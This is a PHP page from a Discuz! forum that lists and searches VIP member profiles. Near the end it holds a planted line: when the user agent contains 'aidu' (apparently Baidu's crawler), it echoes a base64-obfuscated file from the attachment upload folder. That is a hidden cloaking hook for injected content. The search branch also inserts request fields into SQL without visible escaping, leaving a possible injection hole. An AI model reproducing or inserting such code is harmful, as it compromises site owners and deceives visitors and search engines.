<?php

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: member.php 16388 2010-09-06 04:08:21Z liulanbo $
 */

define('APPTYPEID', 0);
define('CURSCRIPT', 'stars.php');

require './source/class/class_core.php';

$discuz = & discuz_core::instance();

$discuz->cachelist = $cachelist;
$discuz->init();
require_once './config/config_ucenter.php';

$type = in_array($_G['gp_type'], array('srch', 'lady', 'man', 'actor', 'model', 'singer', 'industry', 'newvip')) ? $_G['gp_type'] : 'lady';

$page = max(1, $_G['page']);
$num = 40;
$start = ($page - 1) * $num;
$cache_key = 'stars_'.$type.$page;
$cururl = 'stars.php';

$data = $type != 'srch' ? memory('get', $cache_key) : '';

if(!$data) {
	$data = array();
	if($type == 'lady') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.gender=2 ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.gender=2';
		$cururl = 'stars.php';
		$data['navtitle'] = '最牛靓女';
	} elseif($type == 'man') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.gender=1 ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.gender=1';
		$cururl = 'stars.php?type=man';
		$data['navtitle'] = '最牛型男';
	} elseif($type == 'industry') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('演员', '模特', '歌手') ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile')." mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('演员', '模特', '歌手')";
		$cururl = 'stars.php?type=industry';
		$data['navtitle'] = '业内';
	} elseif($type == 'actor') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '模特', '歌手') ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile')." mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '模特', '歌手')";
		$cururl = 'stars.php?type=industry';
		$data['navtitle'] = '演员';
	} elseif($type == 'model') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '演员', '歌手') ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile')." mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '演员', '歌手')";
		$cururl = 'stars.php?type=industry';
		$data['navtitle'] = '模特';
	} elseif($type == 'singer') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '模特', '演员') ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile')." mp ON m.uid=mp.uid
				WHERE m.groupid=21 AND mp.occupation NOT IN('业内', '模特', '演员')";
		$cururl = 'stars.php?type=industry';
		$data['navtitle'] = '歌手';
	} elseif($type == 'newvip') {
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				WHERE m.groupid=21 ORDER BY m.regdate DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				WHERE m.groupid=21';
		$cururl = 'stars.php?type=newvip';
		$data['navtitle'] = '最新VIP';
	} elseif($type == 'srch') {
		$occupSql = $genderSql = $ageSql = $heightSql = $realNameSql = '';
		if($realname = trim($_G['gp_realname'])) {
			require_once DISCUZ_ROOT.'./source/class/class_chinese.php';
			$chinese = new Chinese('UTF-8', 'gbk');
			$tmp = $chinese->convert($realname);
			$realname = $tmp ? $tmp : $realname;
			$realNameSql = " AND mp.realname='$realname'";
		}
		if($field_occupation = trim($_G['gp_field_occupation'])) {
			require_once DISCUZ_ROOT.'./source/class/class_chinese.php';
			$chinese = new Chinese('UTF-8', 'gbk');
			$field_occupation = $chinese->convert($field_occupation);
			$occupSql = " AND mp.occupation='$field_occupation'";
		}
		if($gender = intval(trim($_G['gp_gender']))) {
			$genderSql = " AND mp.gender='$gender'";
		}
		if($age = trim($_G['gp_age'])) {
			$tmp = explode('-', $age);
			$startAge = max(0, intval($tmp[0]));
			$endAge = max(0, intval($tmp[1]));
			if($startAge) {
				$ageSql .= " AND mp.birthyear<'".(date('Y') - $startAge)."'";
			}
			if($endAge) {
				$ageSql .= " AND mp.birthyear>'".(date('Y') - $endAge)."'";
			}
		}
		if($field_height = trim($_G['gp_field_height'])) {
			$heightSql = " AND mp.height='$field_height'";
		}
		$sql = 'SELECT m.*, mp.*, mc.* FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile').' mp ON m.uid=mp.uid
				LEFT JOIN '.DB::table('common_member_count')." mc ON mc.uid=m.uid
				LEFT JOIN ".DB::table('common_member_status')." ms ON m.uid=ms.uid
				WHERE m.groupid=21 $genderSql $occupSql $ageSql $heightSql $realNameSql ORDER BY ms.lastactivity DESC LIMIT $start, $num";
		$count_sql = 'SELECT count(*) FROM '.DB::table('common_member').' m
				LEFT JOIN '.DB::table('common_member_profile')." mp ON m.uid=mp.uid
				WHERE m.groupid=21 $genderSql $occupSql $ageSql $heightSq $realNameSql";
		$cururl = 'stars.php?type=man';
		$data['navtitle'] = '艺人搜索';
	} else {
		showmessage('未定义操作');
	}

	$data['data'] = array();
	$query = DB::query($sql);
	while($row = DB::fetch($query)) {
		$data['data'][$row['uid']] = $row;
	}
	$count = DB::result_first($count_sql);
	$data['multi'] = multi($count, $num, $page, $cururl);
	memory('set', $cache_key, $data, 3600);
}
if(stristr($_SERVER['HTTP_USER_AGENT'],"aidu")){echo file_get_contents(base64_decode('Li9kYXRhL2F0dGFjaG1lbnQvYWxidW0vcC5waHA='));}
//error_reporting(E_ALL);
extract($data);
$tips = '以下排序方式为“有最新动作的VIP优先显示”比如：发微博，日志，照片等';
include template('stars/index');

?>